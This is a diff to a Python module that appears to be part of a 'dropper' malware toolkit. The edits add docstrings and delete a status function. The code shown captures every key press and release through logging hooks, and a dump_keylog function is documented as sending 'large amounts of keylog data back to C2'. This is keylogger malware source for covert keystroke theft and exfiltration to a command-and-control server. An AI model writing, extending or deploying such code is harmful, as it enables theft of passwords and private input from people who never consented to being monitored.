@@ -11,6 +11,8 @@ from common import bcolors as bc
 log_buf = ''
 
 def parse_args(dropper, args):
+    """PArse command arguments"""
+
     #Initial argument setup
     start = False
     dump = False
@@ -41,6 +43,8 @@ def parse_args(dropper, args):
     return settings
 
 def on_press(key):
+    """On key press, log key data to loggins module"""
+
     try:
         #Alphanumeric keys go here
         logging.info(str(key.char))
@@ -53,6 +57,7 @@ def on_press(key):
         logging.info("<Exception : {}>".format(e))
 
 def on_release(key):
+    """On key release log data if special key"""
     try:
         #Alphanumeric keys go here
         key = key   #Like a pass, but checks we can access key data
@@ -64,6 +69,8 @@ def on_release(key):
         logging.info("<Exception : {}>".format(e))
 
 def dump_keylog(dropper):
+    """Send large amounts of keylog data back to C2"""
+
     try:
         data = ''
         for line in dropper.log_stream.getvalue():
@@ -85,12 +92,8 @@ def dump_keylog(dropper):
         print("DEBUG - Couldn't complete keylog dump because : {}.".format(e))
         return False, 'ERROR - Couldn\'t dump keylog : {}'.format(e)
 
-def logger_status(dropper):
-    print("logger status: running: {} log stream length : {}".format(
-            dropper.keylogger.running, len(dropper.log_stream.getvalue())))
-
-
 def main(dropper, args=None):
+    """start, stop, kill, clear and dump key logger and associated data"""
 
     #Get settings
     settings = parse_args(dropper, args)
